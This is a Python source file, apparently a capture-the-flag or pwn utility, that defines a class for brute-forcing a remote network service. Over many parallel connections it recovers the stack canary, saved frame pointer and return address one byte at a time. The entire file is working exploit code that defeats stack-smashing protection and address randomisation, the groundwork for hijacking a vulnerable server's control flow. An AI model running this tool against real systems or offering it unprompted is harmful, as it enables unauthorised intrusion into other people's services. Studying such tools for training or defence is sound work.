from pwn import p64, u64, pack, context, remote
from multiprocessing import Pool, Lock
from functools import partial
from os import system

class BFCanary(object):
    def __init__(self, host, port, padding, successMsg):
        self._pwnsettings()
        self._padding = padding
        self._host = host
        self._port = port
        self._successMsg = successMsg
        self._canary = b''
        self._framepointer = b''
        self._returnAddress = b''
        self._bytes = [pack(decimal, 8) for decimal in range(256)]
        self._bruteforce()

    def _pwnsettings(self):
        context.log_level = 'critical'
            
    def _bruteforce(self):
        while len(self._returnAddress) < 8:
            pool = Pool()
            results = pool.imap_unordered(partial(self._isCorrect, (self._padding + self._canary + self._framepointer + self._returnAddress)), self._bytes)
            pool.close()
            for byte in results:
                if byte:
                    pool.terminate()
                    if len(self._canary + self._framepointer + self._returnAddress) < 8:
                        self._canary = self._canary + byte
                    elif len(self._canary + self._framepointer + self._returnAddress) < 16:
                        self._framepointer = self._framepointer + byte
                    else:
                        self._returnAddress = self._returnAddress + byte
                    break
            pool.join()
            system('clear')
            print('[+] Canary Address: {0}'.format(hex(int.from_bytes(self._canary, 'little'))))
            print('[+] Framepointer Address: {0}'.format(hex(int.from_bytes(self._framepointer, 'little'))))
            print('[+] Return Address: {0}'.format(hex(int.from_bytes(self._returnAddress, 'little'))))

    def _isCorrect(self, payload, byte):
        while True:
            try:
                connection = remote(self._host, self._port)
                break
            except:
                continue
        connection.recvline()
        connection.send(payload + byte)
        try:
            if self._successMsg in connection.recv():
                return byte
        except:
            connection.close()
            pass
        return None

    @property
    def canary(self):
        return u64(self._canary)
    
    @property
    def framepointer(self):
        return u64(self._framepointer)

    @property
    def returnAddress(self):
        return u64(self._returnAddress)
